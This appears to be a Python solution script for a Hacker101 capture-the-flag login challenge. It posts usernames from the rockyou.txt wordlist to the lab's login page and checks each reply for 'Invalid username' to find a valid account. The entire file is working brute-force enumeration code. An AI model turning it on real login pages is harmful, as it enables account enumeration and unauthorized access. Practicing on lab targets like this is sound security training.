import requests

# Specify URL
URL = 'https://479d9e89892c5b613157afcade304547.ctf.hacker101.com/login'

# Specify word list path
word_list_path = '/home/kampff/NoBlackBoxes/repos/OtherBlackBoxes/boxes/security/http/rockyou.txt'

# Open word list file
word_list_file = open(word_list_path, 'r')

# Search for "username"
count  = 0
offset = 3280
while True:
    # Read line(s) from word list (excluding last character, '\n')
    line = word_list_file.readline()[:-1]
    if count > offset:

        # Format login attempt
        attempt = {'username': line, 'password': 'guess'}

        # Post login attempt
        response = requests.post(URL, data = attempt)

        # Check reply for "invalid username"
        reply = response.text
        valid_username = (reply.find("Invalid username") == -1)
        if(valid_username):
            print("Succesfful Attempt!")
            print(attempt)
            break
        else:
            print("Unsuccesfful Attempt: " + attempt['username'] + ' - ' + str(count))
            count += 1
            continue
    else:
        count += 1
        continue

# Close world list file
word_list_file.close()

#FIN